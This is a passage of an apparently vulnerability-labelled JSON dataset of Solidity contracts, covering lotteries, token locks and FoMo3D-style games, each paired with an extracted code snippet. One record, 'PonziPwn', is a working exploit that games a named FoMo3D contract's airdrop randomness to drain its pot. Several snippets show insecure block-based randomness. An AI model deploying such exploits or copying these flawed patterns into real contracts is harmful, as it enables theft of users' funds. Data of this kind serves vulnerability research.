}\n}\nlibrary PCKKeysCalcLong {\n using SafeMath for *;\n function keysRec(uint256 _curEth, uint256 _newEth)\n internal\n pure\n returns (uint256)\n {\n return(keys((_curEth).add(_newEth)).sub(keys(_curEth)));\n }\n function ethRec(uint256 _curKeys, uint256 _sellKeys)\n internal\n pure\n returns (uint256)\n {\n return((eth(_curKeys)).sub(eth(_curKeys.sub(_sellKeys))));\n }\n function keys(uint256 _eth)\n internal\n pure\n returns(uint256)\n {\n return ((((((_eth).mul(1000000000000000000)).mul(312500000000000000000000000)).add(5624988281256103515625000000000000000000000000000000000000000000)).sqrt()).sub(74999921875000000000000000000000)) / (156250000);\n }\n function eth(uint256 _keys)\n internal\n pure\n returns(uint256)\n {\n return ((78125000).mul(_keys.sq()).add(((149999843750000).mul(_keys.mul(1000000000000000000))) / (2))) / ((1000000000000000000).sq());\n }\n}\ninterface PCKExtSettingInterface {\n function getFastGap() external view returns(uint256);\n function getLongGap() external view returns(uint256);\n function getFastExtra() external view returns(uint256);\n function getLongExtra() external view returns(uint256);\n}\ninterface PlayCoinGodInterface {\n function deposit() external payable;\n}\ninterface ProForwarderInterface {\n function deposit() external payable returns(bool);\n function status() external view returns(address, address, bool);\n function startMigration(address _newCorpBank) external returns(bool);\n function cancelMigration() external returns(bool);\n function finishMigration() external returns(bool);\n function setup(address _firstCorpBank) external;\n}\ninterface PlayerBookInterface {\n function getPlayerID(address _addr) external returns (uint256);\n function getPlayerName(uint256 _pID) external view returns (bytes32);\n function getPlayerLAff(uint256 _pID) external view returns (uint256);\n function getPlayerAddr(uint256 _pID) external view returns (address);\n function getNameFee() external view returns (uint256);\n function registerNameXIDFromDapp(address _addr, bytes32 _name, uint256 _affCode, bool _all) external payable returns(bool, uint256);\n function registerNameXaddrFromDapp(address _addr, bytes32 _name, address _affCode, bool _all) external payable returns(bool, uint256);\n function registerNameXnameFromDapp(address _addr, bytes32 _name, bytes32 _affCode, bool _all) external payable returns(bool, uint256);\n}\nlibrary NameFilter {\n function nameFilter(string _input)\n internal\n pure\n returns(bytes32)\n {\n bytes memory _temp = bytes(_input);\n uint256 _length = _temp.length;\n require (_length <= 32 && _length > 0, \"string must be between 1 and 32 characters\");\n require(_temp[0] != 0x20 && _temp[_length-1] != 0x20, \"string cannot start or end with space\");\n if (_temp[0] == 0x30)\n {\n require(_temp[1] != 0x78, \"string cannot start with 0x\");\n require(_temp[1] != 0x58, \"string cannot start with 0X\");\n }\n bool _hasNonNumber;\n for (uint256 i = 0; i < _length; i++)\n {\n if (_temp[i] > 0x40 && _temp[i] < 0x5b)\n {\n _temp[i] = byte(uint(_temp[i]) + 32);\n if (_hasNonNumber == false)\n _hasNonNumber = true;\n } else {\n require\n (\n _temp[i] == 0x20 ||\n (_temp[i] > 0x60 && _temp[i] < 0x7b) ||\n (_temp[i] > 0x2f && _temp[i] < 0x3a),\n \"string contains invalid characters\"\n );\n if (_temp[i] == 0x20)\n require( _temp[i+1] != 0x20, \"string cannot contain consecutive spaces\");\n if (_hasNonNumber == false && (_temp[i] < 0x30 || _temp[i] > 0x39))\n _hasNonNumber = true;\n }\n }\n require(_hasNonNumber == true, \"string cannot be only numbers\");\n bytes32 _ret;\n assembly {\n _ret := mload(add(_temp, 32))\n }\n return (_ret);\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b)\n internal\n pure\n returns (uint256 c)\n {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n require(c / a == b, \"SafeMath mul failed\");\n return c;\n }\n function sub(uint256 a, uint256 b)\n internal\n pure\n returns (uint256)\n {\n require(b <= a, \"SafeMath sub failed\");\n return a - b;\n }\n function add(uint256 a, uint256 b)\n internal\n pure\n returns (uint256 c)\n {\n c = a + b;\n require(c >= a, \"SafeMath add failed\");\n return c;\n }\n function sqrt(uint256 x)\n internal\n pure\n returns (uint256 y)\n {\n uint256 z = ((add(x,1)) / 2);\n y = x;\n while (z < y)\n {\n y = z;\n z = ((add((x / z),z)) / 2);\n }\n }\n function sq(uint256 x)\n internal\n pure\n returns (uint256)\n {\n return (mul(x,x));\n }\n function pwr(uint256 x, uint256 y)\n internal\n pure\n returns (uint256)\n {\n if (x==0)\n return (0);\n else if (y==0)\n return (1);\n else\n {\n uint256 z = x;\n for (uint256 i=1; i < y; i++)\n z = mul(z,x);\n return (z);\n }\n }\n}",
  "extract_feature": [
    "function airdrop() private view returns(bool) {\nuint256 seed = uint256(keccak256(abi.encodePacked(\n(block.timestamp).add\n(block.difficulty).add\n((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add\n(block.gaslimit).add\n((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add\n(block.number)\n)));\nif((seed - ((seed / 1000) * 1000)) < airDropTracker_)\nreturn(true);\nelse\nreturn(false);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6a750a970a4fdc0b65"
  },
  "filename": "3050.sol",
  "content": "pragma solidity ^0.4.24;\ninterface FoMo3DlongInterface {\n function airDropTracker_() external returns (uint256);\n function airDropPot_() external returns (uint256);\n function withdraw() external;\n}\ncontract BlankContract {\n constructor() public {}\n}\ncontract AirDropWinner {\n FoMo3DlongInterface private fomo3d = FoMo3DlongInterface(0xA62142888ABa8370742bE823c1782D17A0389Da1);\n constructor() public {\n if(!address(fomo3d).call.value(0.1 ether)()) {\n fomo3d.withdraw();\n selfdestruct(msg.sender);\n }\n }\n}\ncontract PonziPwn {\n FoMo3DlongInterface private fomo3d = FoMo3DlongInterface(0xA62142888ABa8370742bE823c1782D17A0389Da1);\n address private admin;\n uint256 private blankContractGasLimit = 20000;\n uint256 private pwnContractGasLimit = 250000;\n uint256 private gasPrice = 10;\n uint256 private gasPriceInWei = gasPrice*1e9;\n uint256 private blankContractCost = blankContractGasLimit*gasPrice ;\n uint256 private pwnContractCost = pwnContractGasLimit*gasPrice;\n uint256 private maxAmount = 10 ether;\n modifier onlyAdmin() {\n require(msg.sender == admin);\n _;\n }\n constructor() public {\n admin = msg.sender;\n }\n function checkPwnData() private returns(uint256,uint256,address) {\n address _newSender = address(keccak256(abi.encodePacked(0xd6, 0x94, address(this), 0x01)));\n uint256 _nContracts = 0;\n uint256 _pwnCost = 0;\n uint256 _seed = 0;\n uint256 _tracker = fomo3d.airDropTracker_();\n bool _canWin = false;\n while(!_canWin) {\n _seed = uint256(keccak256(abi.encodePacked(\n (block.timestamp) +\n (block.difficulty) +\n ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)) +\n (block.gaslimit) +\n ((uint256(keccak256(abi.encodePacked(_newSender)))) / (now)) +\n (block.number)\n )));\n if((_seed - ((_seed / 1000) * 1000)) >= _tracker) {\n _newSender = address(keccak256(abi.encodePacked(0xd6, 0x94, _newSender, 0x01)));\n _nContracts++;\n _pwnCost+= blankContractCost;\n } else {\n _canWin = true;\n _pwnCost += pwnContractCost;\n }\n }\n return (_pwnCost,_nContracts,_newSender);\n }\n function deployContracts(uint256 _nContracts,address _newSender) private {\n for(uint256 _i; _i < _nContracts; _i++) {\n if(_i++ == _nContracts) {\n address(_newSender).call.value(0.1 ether)();\n new AirDropWinner();\n }\n new BlankContract();\n }\n }\n function beginPwn() public onlyAdmin() {\n uint256 _pwnCost;\n uint256 _nContracts;\n address _newSender;\n (_pwnCost, _nContracts,_newSender) = checkPwnData();\n if(_pwnCost + 0.1 ether < maxAmount) {\n deployContracts(_nContracts,_newSender);\n }\n }\n function withdraw() public onlyAdmin() {\n admin.transfer(address(this).balance);\n }\n}",
  "extract_feature": [
    "function checkPwnData() private returns(uint256,uint256,address) {\naddress _newSender = address(keccak256(abi.encodePacked(0xd6, 0x94, address(this), 0x01)));\nuint256 _nContracts = 0;\nuint256 _pwnCost = 0;\nuint256 _seed = 0;\nuint256 _tracker = fomo3d.airDropTracker_();\nbool _canWin = false;\nwhile(!_canWin) {\n_seed = uint256(keccak256(abi.encodePacked(\n(block.timestamp) +\n(block.difficulty) +\n((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)) +\n(block.gaslimit) +\n((uint256(keccak256(abi.encodePacked(_newSender)))) / (now)) +\n(block.number)\n)));\nif((_seed - ((_seed / 1000) * 1000)) >= _tracker) {\n_newSender = address(keccak256(abi.encodePacked(0xd6, 0x94, _newSender, 0x01)));\n_nContracts++;\n_pwnCost+= blankContractCost;\n} else {\n_canWin = true;\n_pwnCost += pwnContractCost;\n}\n}\nreturn (_pwnCost,_nContracts,_newSender);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6a750a970a4fdc0b66"
  },
  "filename": "3060.sol",
  "content": "pragma solidity ^0.4.23;\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}\ncontract MultiOwnable {\n mapping (address => bool) owners;\n address unremovableOwner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event OwnershipExtended(address indexed host, address indexed guest);\n event OwnershipRemoved(address indexed removedOwner);\n modifier onlyOwner() {\n require(owners[msg.sender]);\n _;\n }\n constructor() public {\n owners[msg.sender] = true;\n unremovableOwner = msg.sender;\n }\n function addOwner(address guest) onlyOwner public {\n require(guest != address(0));\n owners[guest] = true;\n emit OwnershipExtended(msg.sender, guest);\n }\n function removeOwner(address removedOwner) onlyOwner public {\n require(removedOwner != address(0));\n require(unremovableOwner != removedOwner);\n delete owners[removedOwner];\n emit OwnershipRemoved(removedOwner);\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n require(unremovableOwner != msg.sender);\n owners[newOwner] = true;\n delete owners[msg.sender];\n emit OwnershipTransferred(msg.sender, newOwner);\n }\n function isOwner(address addr) public view returns(bool){\n return owners[addr];\n }\n}\ncontract TokenLock is MultiOwnable {\n ERC20 public token;\n mapping (address => uint256) public lockAmounts;\n mapping (address => uint256) public releaseBlocks;\n constructor (address _token) public {\n token = ERC20(_token);\n }\n function getLockAmount(address _addr) external view returns (uint256) {\n return lockAmounts[_addr];\n }\n function getReleaseBlock(address _addr) external view returns (uint256) {\n return releaseBlocks[_addr];\n }\n function lock(address _addr, uint256 _amount, uint256 _releaseBlock) external {\n require(owners[msg.sender]);\n require(_addr != address(0));\n lockAmounts[_addr] = _amount;\n releaseBlocks[_addr] = _releaseBlock;\n }\n function release(address _addr) external {\n require(owners[msg.sender] || msg.sender == _addr);\n require(block.number >= releaseBlocks[_addr]);\n uint256 amount = lockAmounts[_addr];\n lockAmounts[_addr] = 0;\n releaseBlocks[_addr] = 0;\n token.transfer(_addr, amount);\n }\n}\ncontract TokenLockDistribute is Ownable {\n ERC20 public token;\n TokenLock public lock;\n constructor (address _token, address _lock) public {\n token = ERC20(_token);\n lock = TokenLock(_lock);\n }\n function distribute(address _to, uint256 _unlockedAmount, uint256 _lockedAmount, uint256 _releaseBlockNumber) public onlyOwner {\n require(_to != address(0));\n token.transfer(address(lock), _lockedAmount);\n lock.lock(_to, _lockedAmount, _releaseBlockNumber);\n token.transfer(_to, _unlockedAmount);\n emit Distribute(_to, _unlockedAmount, _lockedAmount, _releaseBlockNumber);\n }\n event Distribute(address indexed _to, uint256 _unlockedAmount, uint256 _lockedAmount, uint256 _releaseBlockNumber);\n}",
  "extract_feature": [
    "function release(address _addr) external {\nrequire(owners[msg.sender] || msg.sender == _addr);\nrequire(block.number >= releaseBlocks[_addr]);\nuint256 amount = lockAmounts[_addr];\nlockAmounts[_addr] = 0;\nreleaseBlocks[_addr] = 0;\ntoken.transfer(_addr, amount);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6a750a970a4fdc0b67"
  },
  "filename": "3062.sol",
  "content": "pragma solidity ^0.4.23;\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}\ncontract MultiOwnable {\n mapping (address => bool) owners;\n address unremovableOwner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event OwnershipExtended(address indexed host, address indexed guest);\n event OwnershipRemoved(address indexed removedOwner);\n modifier onlyOwner() {\n require(owners[msg.sender]);\n _;\n }\n constructor() public {\n owners[msg.sender] = true;\n unremovableOwner = msg.sender;\n }\n function addOwner(address guest) onlyOwner public {\n require(guest != address(0));\n owners[guest] = true;\n emit OwnershipExtended(msg.sender, guest);\n }\n function removeOwner(address removedOwner) onlyOwner public {\n require(removedOwner != address(0));\n require(unremovableOwner != removedOwner);\n delete owners[removedOwner];\n emit OwnershipRemoved(removedOwner);\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n require(unremovableOwner != msg.sender);\n owners[newOwner] = true;\n delete owners[msg.sender];\n emit OwnershipTransferred(msg.sender, newOwner);\n }\n function isOwner(address addr) public view returns(bool){\n return owners[addr];\n }\n}\ncontract TokenLock is MultiOwnable {\n ERC20 public token;\n mapping (address => uint256) public lockAmounts;\n mapping (address => uint256) public releaseBlocks;\n constructor (address _token) public {\n token = ERC20(_token);\n }\n function getLockAmount(address _addr) external view returns (uint256) {\n return lockAmounts[_addr];\n }\n function getReleaseBlock(address _addr) external view returns (uint256) {\n return releaseBlocks[_addr];\n }\n function lock(address _addr, uint256 _amount, uint256 _releaseBlock) external {\n require(owners[msg.sender]);\n require(_addr != address(0));\n lockAmounts[_addr] = _amount;\n releaseBlocks[_addr] = _releaseBlock;\n }\n function release(address _addr) external {\n require(owners[msg.sender] || msg.sender == _addr);\n require(block.number >= releaseBlocks[_addr]);\n uint256 amount = lockAmounts[_addr];\n lockAmounts[_addr] = 0;\n releaseBlocks[_addr] = 0;\n token.transfer(_addr, amount);\n }\n}",
  "extract_feature": [
    "function release(address _addr) external {\nrequire(owners[msg.sender] || msg.sender == _addr);\nrequire(block.number >= releaseBlocks[_addr]);\nuint256 amount = lockAmounts[_addr];\nlockAmounts[_addr] = 0;\nreleaseBlocks[_addr] = 0;\ntoken.transfer(_addr, amount);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6a750a970a4fdc0b68"
  },
  "filename": "3082.sol",
  "content": "pragma solidity 0.4.24;\ncontract RandoLotto {\n bool activated;\n address internal owner;\n uint256 internal devFee;\n uint256 internal seed;\n uint256 public totalBids;\n uint256 public hourPot;\n uint256 public dayPot;\n uint256 public weekPot;\n address public hourPotLeader;\n address public dayPotLeader;\n address public weekPotLeader;\n uint256 public hourPotHighscore;\n uint256 public dayPotHighscore;\n uint256 public weekPotHighscore;\n uint256 public hourPotExpiration;\n uint256 public dayPotExpiration;\n uint256 public weekPotExpiration;\n struct threeUints {\n uint256 a;\n uint256 b;\n uint256 c;\n }\n mapping (address => threeUints) playerLastScores;\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n constructor () public {\n owner = msg.sender;\n activated = false;\n totalBids = 0;\n hourPotHighscore = 0;\n dayPotHighscore = 0;\n weekPotHighscore = 0;\n hourPotLeader = msg.sender;\n dayPotLeader = msg.sender;\n weekPotLeader = msg.sender;\n }\n function activate() public payable onlyOwner {\n require(!activated);\n require(msg.value >= 0 ether);\n hourPotExpiration = now + 1 hours;\n dayPotExpiration = now + 1 days;\n weekPotExpiration = now + 1 weeks;\n hourPot = msg.value / 3;\n dayPot = msg.value / 3;\n weekPot = msg.value - hourPot - dayPot;\n activated = true;\n }\n function () public payable {\n bid();\n }\n function bid() public payable returns (uint256, uint256, uint256) {\n require(msg.sender == tx.origin);\n require(msg.value == 0.01 ether);\n checkRoundEnd();\n devFee = devFee + (msg.value / 100);\n uint256 toAdd = msg.value - (msg.value / 100);\n hourPot = hourPot + (toAdd / 3);\n dayPot = dayPot + (toAdd / 3);\n weekPot = weekPot + (toAdd - ((toAdd/3) + (toAdd/3)));\n seed = uint256(keccak256(blockhash(block.number - 1), seed, now));\n uint256 seed1 = seed;\n if (seed > hourPotHighscore) {\n hourPotLeader = msg.sender;\n hourPotExpiration = now + 1 hours;\n hourPotHighscore = seed;\n }\n seed = uint256(keccak256(blockhash(block.number - 1), seed, now));\n uint256 seed2 = seed;\n if (seed > dayPotHighscore) {\n dayPotLeader = msg.sender;\n dayPotExpiration = now + 1 days;\n dayPotHighscore = seed;\n }\n seed = uint256(keccak256(blockhash(block.number - 1), seed, now));\n uint256 seed3 = seed;\n if (seed > weekPotHighscore) {\n weekPotLeader = msg.sender;\n weekPotExpiration = now + 1 weeks;\n weekPotHighscore = seed;\n }\n totalBids++;\n playerLastScores[msg.sender] = threeUints(seed1, seed2, seed3);\n return (seed1, seed2, seed3);\n }\n function checkRoundEnd() internal {\n if (now > hourPotExpiration) {\n uint256 hourToSend = hourPot / 2;\n hourPot = hourPot - hourToSend;\n hourPotLeader.send(hourToSend);\n hourPotLeader = msg.sender;\n hourPotHighscore = 0;\n hourPotExpiration = now + 1 hours;\n }\n if (now > dayPotExpiration) {\n uint256 dayToSend = dayPot / 2;\n dayPot = dayPot - dayToSend;\n dayPotLeader.send(dayToSend);\n dayPotLeader = msg.sender;\n dayPotHighscore = 0;\n dayPotExpiration = now + 1 days;\n }\n if (now > weekPotExpiration) {\n uint256 weekToSend = weekPot / 2;\n weekPot = weekPot - weekToSend;\n weekPotLeader.send(weekToSend);\n weekPotLeader = msg.sender;\n weekPotHighscore = 0;\n weekPotExpiration = now + 1 weeks;\n }\n }\n function claimWinnings() public {\n checkRoundEnd();\n }\n function getMyLastScore() public view returns (uint256, uint256, uint256) {\n return (playerLastScores[msg.sender].a, playerLastScores[msg.sender].b, playerLastScores[msg.sender].c);\n }\n function devWithdraw() public onlyOwner {\n uint256 toSend = devFee;\n devFee = 0;\n owner.transfer(toSend);\n }\n}",
  "extract_feature": [
    "function bid() public payable returns (uint256, uint256, uint256) {\nrequire(msg.sender == tx.origin);\nrequire(msg.value == 0.01 ether);\ncheckRoundEnd();\ndevFee = devFee + (msg.value / 100);\nuint256 toAdd = msg.value - (msg.value / 100);\nhourPot = hourPot + (toAdd / 3);\ndayPot = dayPot + (toAdd / 3);\nweekPot = weekPot + (toAdd - ((toAdd/3) + (toAdd/3)));\nseed = uint256(keccak256(blockhash(block.number - 1), seed, now));\nuint256 seed1 = seed;\nif (seed > hourPotHighscore) {\nhourPotLeader = msg.sender;\nhourPotExpiration = now + 1 hours;\nhourPotHighscore = seed;\n}\nseed = uint256(keccak256(blockhash(block.number - 1), seed, now));\nuint256 seed2 = seed;\nif (seed > dayPotHighscore) {\ndayPotLeader = msg.sender;\ndayPotExpiration = now + 1 days;\ndayPotHighscore = seed;\n}\nseed = uint256(keccak256(blockhash(block.number - 1), seed, now));\nuint256 seed3 = seed;\nif (seed > weekPotHighscore) {\nweekPotLeader = msg.sender;\nweekPotExpiration = now + 1 weeks;\nweekPotHighscore = seed;\n}\ntotalBids++;\nplayerLastScores[msg.sender] = threeUints(seed1, seed2, seed3);\nreturn (seed1, seed2, seed3);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6a750a970a4fdc0b69"
  },
  "filename": "3091.sol",
  "content": "pragma solidity 0.4.24;\ncontract RandoLotto {\n bool activated;\n address internal owner;\n uint256 internal devFee;\n uint256 internal seed;\n uint256 public totalBids;\n uint256 public hourPot;\n uint256 public dayPot;\n uint256 public weekPot;\n address public hourPotLeader;\n address public dayPotLeader;\n address public weekPotLeader;\n uint256 public hourPotHighscore;\n uint256 public dayPotHighscore;\n uint256 public weekPotHighscore;\n uint256 public hourPotExpiration;\n uint256 public dayPotExpiration;\n uint256 public weekPotExpiration;\n struct threeUints {\n uint256 a;\n uint256 b;\n uint256 c;\n }\n mapping (address => threeUints) playerLastScores;\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n constructor () public {\n owner = msg.sender;\n activated = false;\n totalBids = 0;\n hourPotHighscore = 0;\n dayPotHighscore = 0;\n weekPotHighscore = 0;\n hourPotLeader = msg.sender;\n dayPotLeader = msg.sender;\n weekPotLeader = msg.sender;\n }\n function activate() public payable onlyOwner {\n require(!activated);\n require(msg.value >= 0 ether);\n hourPotExpiration = now + 1 hours;\n dayPotExpiration = now + 1 days;\n weekPotExpiration = now + 1 weeks;\n hourPot = msg.value / 3;\n dayPot = msg.value / 3;\n weekPot = msg.value - hourPot - dayPot;\n activated = true;\n }\n function () public payable {\n bid();\n }\n function bid() public payable returns (uint256, uint256, uint256) {\n require(msg.sender == tx.origin);\n require(msg.value == 0.001 ether);\n checkRoundEnd();\n devFee = devFee + (msg.value / 100);\n uint256 toAdd = msg.value - devFee;\n hourPot = hourPot + (toAdd / 3);\n dayPot = dayPot + (toAdd / 3);\n weekPot = weekPot + (toAdd - ((toAdd/3) + (toAdd/3)));\n seed = uint256(keccak256(blockhash(block.number - 1), seed, now));\n uint256 seed1 = seed;\n if (seed > hourPotHighscore) {\n hourPotLeader = msg.sender;\n hourPotExpiration = now + 1 hours;\n hourPotHighscore = seed;\n }\n seed = uint256(keccak256(blockhash(block.number - 1), seed, now));\n uint256 seed2 = seed;\n if (seed > dayPotHighscore) {\n dayPotLeader = msg.sender;\n dayPotExpiration = now + 1 days;\n dayPotHighscore = seed;\n }\n seed = uint256(keccak256(blockhash(block.number - 1), seed, now));\n uint256 seed3 = seed;\n if (seed > weekPotHighscore) {\n weekPotLeader = msg.sender;\n weekPotExpiration = now + 1 weeks;\n weekPotHighscore = seed;\n }\n totalBids++;\n playerLastScores[msg.sender] = threeUints(seed1, seed2, seed3);\n return (seed1, seed2, seed3);\n }\n function checkRoundEnd() internal {\n if (now > hourPotExpiration) {\n uint256 hourToSend = hourPot / 2;\n hourPot = hourPot - hourToSend;\n hourPotLeader.transfer(hourToSend);\n hourPotLeader = msg.sender;\n hourPotHighscore = 0;\n hourPotExpiration = now + 1 hours;\n }\n if (now > dayPotExpiration) {\n uint256 dayToSend = dayPot / 2;\n dayPot = dayPot - dayToSend;\n dayPotLeader.transfer(dayToSend);\n dayPotLeader = msg.sender;\n dayPotHighscore = 0;\n dayPotExpiration = now + 1 days;\n }\n if (now > weekPotExpiration) {\n uint256 weekToSend = weekPot / 2;\n weekPot = weekPot - weekToSend;\n weekPotLeader.transfer(weekToSend);\n weekPotLeader = msg.sender;\n weekPotHighscore = 0;\n weekPotExpiration = now + 1 weeks;\n }\n }\n function claimWinnings() public {\n checkRoundEnd();\n }\n function getMyLastScore() public view returns (uint256, uint256, uint256) {\n return (playerLastScores[msg.sender].a, playerLastScores[msg.sender].b, playerLastScores[msg.sender].c);\n }\n function devWithdraw() public onlyOwner {\n uint256 toSend = devFee;\n devFee = 0;\n owner.transfer(toSend);\n }\n}",
  "extract_feature": [
    "function bid() public payable returns (uint256, uint256, uint256) {\nrequire(msg.sender == tx.origin);\nrequire(msg.value == 0.001 ether);\ncheckRoundEnd();\ndevFee = devFee + (msg.value / 100);\nuint256 toAdd = msg.value - devFee;\nhourPot = hourPot + (toAdd / 3);\ndayPot = dayPot + (toAdd / 3);\nweekPot = weekPot + (toAdd - ((toAdd/3) + (toAdd/3)));\nseed = uint256(keccak256(blockhash(block.number - 1), seed, now));\nuint256 seed1 = seed;\nif (seed > hourPotHighscore) {\nhourPotLeader = msg.sender;\nhourPotExpiration = now + 1 hours;\nhourPotHighscore = seed;\n}\nseed = uint256(keccak256(blockhash(block.number - 1), seed, now));\nuint256 seed2 = seed;\nif (seed > dayPotHighscore) {\ndayPotLeader = msg.sender;\ndayPotExpiration = now + 1 days;\ndayPotHighscore = seed;\n}\nseed = uint256(keccak256(blockhash(block.number - 1), seed, now));\nuint256 seed3 = seed;\nif (seed > weekPotHighscore) {\nweekPotLeader = msg.sender;\nweekPotExpiration = now + 1 weeks;\nweekPotHighscore = seed;\n}\ntotalBids++;\nplayerLastScores[msg.sender] = threeUints(seed1, seed2, seed3);\nreturn (seed1, seed2, seed3);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6a750a970a4fdc0b6a"
  },
  "filename": "3096.sol",
  "content": "pragma solidity ^0.4.24;\ncontract PCKevents {\n event onNewName\n (\n uint256 indexed playerID,\n address indexed playerAddress,\n bytes32 indexed playerName,\n bool isNewPlayer,\n uint256 affiliateID,\n address affiliateAddress,\n bytes32 affiliateName,\n uint256 amountPaid,\n uint256 timeStamp\n );\n event onEndTx\n (\n uint256 compressedData,\n uint256 compressedIDs,\n bytes32 playerName,\n address playerAddress,\n uint256 ethIn,\n uint256 keysBought,\n address winnerAddr,\n bytes32 winnerName,\n uint256 amountWon,\n uint256 newPot,\n uint256 PCPAmount,\n uint256 genAmount,\n uint256 potAmount,\n uint256 airDropPot\n );\n event onWithdraw\n (\n uint256 indexed playerID,\n address playerAddress,\n bytes32 playerName,\n uint256 ethOut,\n uint256 timeStamp\n );\n event onWithdrawAndDistribute\n (\n address playerAddress,\n bytes32 playerName,\n uint256 ethOut,\n uint256 compressedData,\n uint256 compressedIDs,\n address winnerAddr,\n bytes32 winnerName,\n uint256 amountWon,\n uint256 newPot,\n uint256 PCPAmount,\n uint256 genAmount\n );\n event onBuyAndDistribute\n (\n address playerAddress,\n bytes32 playerName,\n uint256 ethIn,\n uint256 compressedData,\n uint256 compressedIDs,\n address winnerAddr,\n bytes32 winnerName,\n uint256 amountWon,\n uint256 newPot,\n uint256 PCPAmount,\n uint256 genAmount\n );\n event onReLoadAndDistribute\n (\n address playerAddress,\n bytes32 playerName,\n uint256 compressedData,\n uint256 compressedIDs,\n address winnerAddr,\n bytes32 winnerName,\n uint256 amountWon,\n uint256 newPot,\n uint256 PCPAmount,\n uint256 genAmount\n );\n event onAffiliatePayout\n (\n uint256 indexed affiliateID,\n address affiliateAddress,\n bytes32 affiliateName,\n uint256 indexed roundID,\n uint256 indexed buyerID,\n uint256 amount,\n uint256 timeStamp\n );\n event onPotSwapDeposit\n (\n uint256 roundID,\n uint256 amountAddedToPot\n );\n}\ncontract modularKey is PCKevents {}\ncontract PlayCoinKey is modularKey {\n using SafeMath for *;\n using NameFilter for string;\n using PCKKeysCalcLong for uint256;\n PlayCoinGodInterface constant private PCGod = PlayCoinGodInterface(0x6f93Be8fD47EBb62F54ebd149B58658bf9BaCF4f);\n PlayerBookInterface constant private PlayerBook = PlayerBookInterface(0x47D1c777f1853cac97E6b81226B1F5108FBD7B81);\n string constant public name = \"PlayCoin Key\";\n string constant public symbol = \"PCK\";\n uint256 private rndExtra_ = 15 minutes;\n uint256 private rndGap_ = 15 minutes;\n uint256 constant private rndInit_ = 12 hours;\n uint256 constant private rndInc_ = 30 seconds;\n uint256 constant private rndMax_ = 6 hours;\n uint256 constant private rndMin_ = 10 minutes;\n uint256 public rndReduceThreshold_ = 10e18;\n bool public closed_ = false;\n address private admin = msg.sender;\n uint256 public airDropPot_;\n uint256 public airDropTracker_ = 0;\n uint256 public rID_;\n mapping (address => uint256) public pIDxAddr_;\n mapping (bytes32 => uint256) public pIDxName_;\n mapping (uint256 => PCKdatasets.Player) public plyr_;\n mapping (uint256 => mapping (uint256 => PCKdatasets.PlayerRounds)) public plyrRnds_;\n mapping (uint256 => mapping (bytes32 => bool)) public plyrNames_;\n mapping (uint256 => PCKdatasets.Round) public round_;\n mapping (uint256 => mapping(uint256 => uint256)) public rndTmEth_;\n mapping (uint256 => PCKdatasets.TeamFee) public fees_;\n mapping (uint256 => PCKdatasets.PotSplit) public potSplit_;\n constructor()\n public\n {\n fees_[0] = PCKdatasets.TeamFee(30,6);\n fees_[1] = PCKdatasets.TeamFee(43,0);\n fees_[2] = PCKdatasets.TeamFee(56,10);\n fees_[3] = PCKdatasets.TeamFee(43,8);\n potSplit_[0] = PCKdatasets.PotSplit(15,10);\n potSplit_[1] = PCKdatasets.PotSplit(25,0);\n potSplit_[2] = PCKdatasets.PotSplit(20,20);\n potSplit_[3] = PCKdatasets.PotSplit(30,10);\n }\n modifier isActivated() {\n require(activated_ == true, \"its not ready yet. check ?eta in discord\");\n _;\n }\n modifier isRoundActivated() {\n require(round_[rID_].ended == false, \"the round is finished\");\n _;\n }\n modifier isHuman() {\n address _addr = msg.sender;\n uint256 _codeLength;\n require(msg.sender == tx.origin, \"sorry humans only\");\n _;\n }\n modifier isWithinLimits(uint256 _eth) {\n require(_eth >= 1000000000, \"pocket lint: not a valid currency\");\n require(_eth <= 100000000000000000000000, \"no vitalik, no\");\n _;\n }\n modifier onlyAdmins() {\n require(msg.sender == admin, \"onlyAdmins failed - msg.sender is not an admin\");\n _;\n }\n function kill () onlyAdmins() public {\n require(round_[rID_].ended == true && closed_ == true, \"the round is active or not close\");\n selfdestruct(admin);\n }\n function getRoundStatus() isActivated() public view returns(uint256, bool){\n return (rID_, 